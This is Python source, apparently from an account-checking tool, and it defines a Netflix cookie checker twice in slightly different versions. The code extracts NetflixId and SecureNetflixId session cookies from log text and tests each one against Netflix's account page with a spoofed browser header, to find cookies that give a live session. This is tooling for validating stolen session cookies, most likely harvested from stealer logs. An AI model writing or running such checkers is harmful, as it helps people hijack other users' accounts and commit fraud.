import re, aiohttp
from ..base import BaseChecker

class NetflixCookieChecker(BaseChecker):
    def __init__(self):
        super().__init__(timeout=30)
        self.name = "Netflix"

    async def check_account(self, email: str, password: str) -> bool:
        return False

    async def check_cookie(self, cookie: str) -> bool:
        try:
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0"}
                async with session.get("https://www.netflix.com/YourAccount", headers=headers, allow_redirects=False) as resp:
                    text = await resp.text()
                    return resp.status == 200 and ("memberSince" in text or "accountDetails" in text)
        except:
            return False

    def extract_cookies_from_text(self, text: str) -> list:
        found = []
        pattern = r'(NetflixId=[^;]+;\s*SecureNetflixId=[^;]+[^\n]*)'
        matches = re.findall(pattern, text)
        found.extend(matches)
        return list(set(found))
import re, aiohttp
from ..base import BaseChecker

class NetflixCookieChecker(BaseChecker):
    def __init__(self):
        super().__init__(timeout=30)
        self.name = "Netflix"

    # Netflix cookie patterns to search in logs
    COOKIE_PATTERNS = [
        r'NetflixId=([^;\s]+)',
        r'SecureNetflixId=([^;\s]+)',
        r'nfvdid=([^;\s]+)',
    ]

    async def check_account(self, email: str, password: str) -> bool:
        return False  # Not used for cookie checker

    async def check_cookie(self, cookie: str) -> bool:
        """Check if Netflix cookie is valid by accessing account page."""
        try:
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                headers = {
                    "Cookie": cookie,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                async with session.get(
                    "https://www.netflix.com/YourAccount",
                    headers=headers,
                    allow_redirects=False
                ) as resp:
                    text = await resp.text()
                    # Valid cookie stays on Netflix, invalid redirects to login
                    return resp.status == 200 and ("memberSince" in text or "accountDetails" in text)
        except:
            return False

    def extract_cookies_from_text(self, text: str) -> list:
        """Extract Netflix cookies from log text."""
        found_cookies = []
        
        # Try to find complete cookie strings
        # Pattern: NetflixId=xxx; SecureNetflixId=yyy; ...
        netflix_cookie_pattern = r'(NetflixId=[^;]+;\s*SecureNetflixId=[^;]+[^\n]*)'
        matches = re.findall(netflix_cookie_pattern, text)
        found_cookies.extend(matches)
        
        # Also try individual patterns
        for pattern in self.COOKIE_PATTERNS:
            matches = re.findall(pattern, text)
            for match in matches:
                cookie_str = f"{pattern.split('=')[0]}={match}"
                if cookie_str not in found_cookies:
                    found_cookies.append(cookie_str)
        
        # Deduplicate
        return list(set(found_cookies))
